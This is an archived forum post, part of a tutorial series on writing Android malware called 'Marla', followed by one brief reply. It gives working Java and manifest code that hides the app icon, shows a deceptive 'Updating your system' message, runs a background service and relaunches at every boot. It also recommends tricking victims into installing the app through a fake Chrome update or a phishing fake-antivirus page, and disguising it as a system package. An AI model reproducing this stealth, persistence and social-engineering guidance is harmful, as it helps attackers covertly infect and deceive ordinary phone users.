<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Android Malware : A tumor called Marla 0x02 - Malware - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="A Tumor Called Marla

Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service. 
When the Malware run for the first time it will hide the app icon from the user laucher, and&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="851.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Android Malware : A tumor called Marla 0x02&#39;" href="851.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png" />
<meta property="og:url" content="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851" />
<meta name="twitter:url" content="https://0x00sec.org/t/android-malware-a-tumor-called-marla-0x02/851" />
<meta property="og:title" content="Android Malware : A tumor called Marla 0x02" />
<meta name="twitter:title" content="Android Malware : A tumor called Marla 0x02" />
<meta property="og:description" content="A Tumor Called Marla  Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service.  When the Malware run for the first time it will hide the app icon from the user laucher, and run a service.  The service only query the OS version for the moment, we will be much more malicious in the next tutorial.  How to infect user ?  When the user will install the malware, we want it to be  persistent.  We need to force the user to install our malware and run it bu..." />
<meta name="twitter:description" content="A Tumor Called Marla  Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service.  When the Malware run for the first time it will hide the app icon from the user laucher, and run a service.  The service only query the OS version for the moment, we will be much more malicious in the next tutorial.  How to infect user ?  When the user will install the malware, we want it to be  persistent.  We need to force the user to install our malware and run it bu..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="android" />
<meta property="og:article:tag" content="service" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="1 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="12 ❤" />
<meta property="article:published_time" content="2016-07-29T13:42:29+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="851.html">Android Malware : A tumor called Marla 0x02</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/malware.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #F7941D"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Malware</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
<a href="../../tag/android.html" class="discourse-tag" rel="tag">android</a>,
<a href="../../tag/service.html" class="discourse-tag" rel="tag">service</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Android Malware : A tumor called Marla 0x02">
<meta itemprop="articleSection" content="Malware">
<meta itemprop="keywords" content="malware, android, service, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/L3akM3-0day"><span itemprop="name">L3akM3-0day</span></a>
</span>
<link itemprop="mainEntityOfPage" href="851.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-07-29T13:42:29Z" class="post-time">
July 29, 2016, 1:42pm
</time>
<meta itemprop="dateModified" content="2016-07-29T13:42:29Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<h1>A Tumor Called Marla</h1>
<hr>
<p>Hi everyone, today we will cover how to hide our malware from the user and run our malware as a service.<br>
When the Malware run for the first time it will hide the app icon from the user laucher, and run a service.<br>
The service only query the OS version for the moment, we will be much more malicious in the next tutorial.</p>
<h2>How to infect user ?</h2>
<hr>
<p>When the user will install the malware, we want it to be persistent.<br>
We need to force the user to install our malware and run it but how ?</p>
<h3>Social Engineering</h3>
<p>Here is one of the way to force the user to download <strong>Marla</strong><br>
Fake Chrome update ( Everyone use chrome on android, most of the user ) or a fake antivirus ( Phishing page telling the user get 10 virus. Trick him to download your “Antivirus” <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"> )</p>
<p>If you choose the Antivirus way, make an app that look like a legit antivirus.<br>
When the user will download, install the app and run it. We are good <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<h3>Why should we use these techniques ?</h3>
<p>New version of android need to be run once to be able to be started at boot time and use permission ( see <a href="../android-malware-start-the-app-at-boot-and-get-kernel-version-0x01/786.html">Android Malware</a> for more information about permission).</p>
<h2>Hiding app icon</h2>
<p>Let’s start to code and hide our app icon <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Today our task is to disable the app component of our application <em>here the icon</em>. (You can start from scratch or use the old code of the previous tutorial ).</p>
<p><em>n.b : The app won’t be persistent If the user haven’t his phone rooted. The user will be able to uninstall the malware however If the android phone is rooted we can hide the app as a system app and give a name like : com.android.update, he won’t be able to uninstall system app</em></p>
<p>Main Activity</p>
<pre><code class="lang-java">package com.android.marla;

import android.content.pm.PackageManager;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        PackageManager pm = this.getPackageManager();
        //The line below will hide your app icon
        pm.setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        //Just show a Toast
        Toast.makeText(this, "Updating your system please wait ...", Toast.LENGTH_LONG);


    }
}



</code></pre>
<p>Here is what you should see<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/e76719336447356331cb7a3fb59052219fd03cb2.png" width="322" height="479"></p>
<p>Now if you kill the app after a moment.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/1X/d0ff572134c98cd2e9764551f615be2f34a98514.png" width="320" height="478"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/1X/e3a0b552ec7d53861e2388c220a787f8665c5f6d.png" width="321" height="481"></p>
<p>No Marla app <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
<h2>Run a service</h2>
<p>We want a running service that can gather information. Let’s make a new class</p>
<pre><code class="lang-java">package com.android.marla;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.support.annotation.Nullable;
import android.widget.Toast;

public class MainService extends Service{

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }


    public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"Malware started",Toast.LENGTH_LONG).show();
            }
        });
    }

}

</code></pre>
<p>Here I just create a Toast for PoC , here is the function</p>
<pre><code class="lang-java"> public void onCreate()
    {
        Handler handler = new Handler(Looper.getMainLooper());
        handler.post(new Runnable(){

            @Override
            public void run() {
                Toast.makeText(getApplicationContext(),"Malware started",Toast.LENGTH_LONG).show();
            }
        });
    }
</code></pre>
<p>In your android Manifest add the service</p>
<pre><code class="lang-xml">&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.android.marla"&gt;
    &lt;!--PERMISSION--&gt;
    &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/&gt;
    &lt;!--PERMISSION--&gt;
    &lt;application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:supportsRtl="true"
        android:theme="@style/AppTheme"&gt;
        &lt;activity android:name=".MainActivity"&gt;
            &lt;intent-filter&gt;
                &lt;action android:name="android.intent.action.MAIN" /&gt;

                &lt;category android:name="android.intent.category.LAUNCHER" /&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;!-- THE SERVICE IS BELOW--&gt;
        &lt;service android:name=".MainService"/&gt;
    &lt;/application&gt;

&lt;/manifest&gt;
</code></pre>
<p>Well done <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> You’ve created a service now let’s run it at boot time. ( I hope you remember the previous tutorial for this part)<br>
Receiver :</p>
<pre><code class="lang-java">package com.android.marla;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        /** if the boot is completed **/
        if(Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())){
            /** Start the MainActivity.class everytime the phone boot**/
            Intent i = new Intent(context, MainActivity.class);
            context.startActivity(i);
        }
    }
}
</code></pre>
<p>Well done, your application is not malicious for the moment. Your app look like an adware for the moment.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="10" />
<span class="post-likes">10 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../android-malware-a-tumor-called-marla-0x02-c/859.html">Android Malware: A Tumor called Marla 0x02 [C#]</a>
<meta itemprop="position" content="2">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/afiskon"><span itemprop="name">afiskon</span></a>
</span>
<link itemprop="mainEntityOfPage" href="851.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2016-07-29T13:50:06Z" class="post-time">
July 29, 2016, 1:50pm
</time>
<meta itemprop="dateModified" content="2016-07-29T13:50:06Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks for an article! Well done!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="851.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-01-21T00:42:20Z" class="post-time">
January 21, 2018, 12:42am
</time>
<meta itemprop="dateModified" content="2018-01-21T00:42:20Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
